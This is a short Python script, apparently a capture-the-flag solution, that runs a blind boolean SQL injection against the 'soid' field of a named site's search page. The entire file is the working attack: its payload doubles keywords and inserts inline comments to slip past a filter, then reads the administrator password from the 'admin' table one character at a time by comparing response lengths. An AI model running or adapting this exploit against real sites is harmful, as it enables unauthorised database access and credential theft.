#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests

def get_db():
    url = "http://cms.nuptzj.cn/so.php"
    header = {
        'User-Agent': 'Xlcteam Browser',
        'Host': 'cms.nuptzj.cn',
    }
    payload1 = "0123456789"
    result= ""
    for j in range(1,35):
        for i in payload1:
            char = str(ord(i))
            num = str(j)
            # payload = '1/*x*/anANDd/*x*/exists(seleSELECTct/*x*/*/*x*/frFROMom/*x*/admiADMINn/*x*/WHERE/*x*/oORrd(substring(userpaspasss/*x*/froFROMm/*x*/' + num + '/*a*/FOorR/*a*/1))>' + fuck + ')'
            payload = '1/*x*/anANDd/*x*/exists(seleSELECTct/*x*/*/*x*/frFROMom/*x*/admiADMINn/*x*/WHERE/*x*/oORrd(substring(userpaspasss/*x*/froFROMm/*x*/{0}/*a*/FOorR/*a*/1))>{1})'.format(num,char)
            data = {
                "soid":payload
            }
            response = requests.post(url=url,headers=header,data=data)
            result_len = len(response.text)
            if(result_len < 430):
                result += chr(int(char))
                break
    print(result)

get_db()
